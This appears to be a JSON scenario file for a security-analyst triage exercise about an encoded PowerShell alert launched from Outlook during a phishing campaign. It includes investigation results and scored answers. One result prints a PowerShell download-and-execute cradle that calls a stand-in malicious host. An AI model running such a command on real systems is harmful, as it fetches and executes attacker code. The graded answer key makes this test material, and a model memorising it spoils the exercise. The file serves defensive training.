@@ -1,0 +1,139 @@
+{
+  "id": "scenario_001",
+  "title": "Suspicious PowerShell Execution",
+  "description": "An alert has fired for encoded PowerShell execution spawned from an Office application. Investigate the alert and determine the appropriate response.",
+  "difficulty": "Medium",
+  "alert": {
+    "title": "Encoded PowerShell Command Execution",
+    "severity": "Medium",
+    "timestamp": "2026-02-07 14:23:15 UTC",
+    "fields": {
+      "Host": "DESKTOP-7K9M2WL",
+      "User": "jsmith",
+      "Process": "powershell.exe -encodedcommand [base64]",
+      "Parent Process": "outlook.exe",
+      "Detection Rule": "Encoded PowerShell from Office Application"
+    }
+  },
+  "investigation_actions": [
+    {
+      "id": "decode_powershell",
+      "label": "Decode the PowerShell command",
+      "result": {
+        "type": "code",
+        "content": "IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain[.]com/payload.ps1')"
+      },
+      "weight": "essential",
+      "requires": []
+    },
+    {
+      "id": "check_edr",
+      "label": "Check endpoint protection logs",
+      "result": {
+        "type": "text",
+        "content": "EDR blocked outbound connection to malicious-domain[.]com at 14:23:16. Domain flagged as known malicious. Process terminated automatically."
+      },
+      "weight": "essential",
+      "requires": []
+    },
+    {
+      "id": "check_process_tree",
+      "label": "Check process tree/child processes",
+      "result": {
+        "type": "text",
+        "content": "PowerShell spawned by outlook.exe at 14:23:15, terminated after 0.8 seconds. No child processes created."
+      },
+      "weight": "good_practice",
+      "requires": []
+    },
+    {
+      "id": "check_email",
+      "label": "Review user's recent email activity",
+      "result": {
+        "type": "text",
+        "content": "Email received at 14:22:47 from 'IT Support <noreply@legitimate-looking-domain[.]com>' with subject 'Urgent: Password Reset Required'. Email contains suspicious link that matches click timestamp."
+      },
+      "weight": "essential",
+      "requires": []
+    },
+    {
+      "id": "check_domain_reputation",
+      "label": "Look up domain reputation",
+      "result": {
+        "type": "text",
+        "content": "Domain malicious-domain[.]com registered 3 days ago. Flagged by VirusTotal (8/89 vendors), associated with credential harvesting campaigns per threat intel feeds."
+      },
+      "weight": "good_practice",
+      "requires": ["decode_powershell", "check_edr"]
+    },
+    {
+      "id": "check_network",
+      "label": "Query network connections from host",
+      "result": {
+        "type": "text",
+        "content": "Attempted connection to malicious-domain[.]com:443 blocked by firewall at 14:23:16. No successful outbound connections established."
+      },
+      "weight": "good_practice",
+      "requires": ["decode_powershell", "check_edr"]
+    },
+    {
+      "id": "check_campaign",
+      "label": "Check if other users received similar emails",
+      "result": {
+        "type": "text",
+        "content": "12 other users in organization received identical emails in past 2 hours. 2 others clicked the link and generated similar alerts."
+      },
+      "weight": "good_practice",
+      "requires": ["check_email"]
+    },
+    {
+      "id": "check_user_account",
+      "label": "Check user's account for suspicious activity",
+      "result": {
+        "type": "text",
+        "content": "No unusual logon attempts. No privilege escalation. No lateral movement indicators. Last successful logon was 08:45 this morning from expected location."
+      },
+      "weight": "neutral",
+      "requires": ["check_edr"]
+    }
+  ],
+  "decisions": [
+    {
+      "id": "escalate_full",
+      "label": "Escalate to IR team - active phishing campaign affecting multiple users",
+      "outcome": "correct",
+      "base_points": 100,
+      "feedback": "Correct! You identified this as part of a broader phishing campaign requiring immediate response. The malicious payload was blocked, but other users were targeted and the campaign needs to be contained."
+    },
+    {
+      "id": "escalate_partial",
+      "label": "Escalate to IR team - single user compromise attempt",
+      "outcome": "partial",
+      "base_points": 70,
+      "feedback": "Partially correct. You correctly identified this as a real threat requiring escalation, but missed that this is an active campaign affecting multiple users (check the email campaign investigation)."
+    },
+    {
+      "id": "create_rule",
+      "label": "Create detection rule for similar activity and close",
+      "outcome": "incorrect",
+      "base_points": 40,
+      "feedback": "Incorrect. While creating a detection rule is valuable, you missed that this is an active campaign affecting multiple users right now. This requires immediate escalation to handle the broader incident."
+    },
+    {
+      "id": "close_blocked",
+      "label": "Close - threat was blocked by security controls",
+      "outcome": "incorrect",
+      "base_points": 30,
+      "feedback": "Incorrect. While it's true the payload was blocked, this represents an active phishing campaign targeting your organization. The incident response team needs to investigate the full scope and take containment actions."
+    },
+    {
+      "id": "close_false_positive",
+      "label": "Close as false positive",
+      "outcome": "incorrect",
+      "base_points": 0,
+      "feedback": "Incorrect. This was a genuine phishing attempt with malicious payload delivery. The encoded PowerShell and malicious domain confirm this was a real attack, not a false positive."
+    }
+  ],
+  "optimal_investigation_count": 4,
+  "max_investigation_count": 8
+}
